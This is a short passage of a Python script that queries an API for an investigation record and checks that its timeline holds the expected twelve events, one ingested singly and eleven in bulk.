inv_detail = session.get(f"{API_BASE}/investigations/{inv_id}/").json()
total_timeline = len(inv_detail["timeline_events"])
print(f"[+] Total timeline events in Investigation '{inv_id}': {total_timeline}")

if total_timeline == 12:
    print(f"\n✅ Verification SUCCESS: 1 item ingested individually + 11 items ingested in bulk = 12 total items on '{inv_id}'!")
else:
    print(f"\n⚠️ Unexpected event count: expected 12, found {total_timeline}")
```
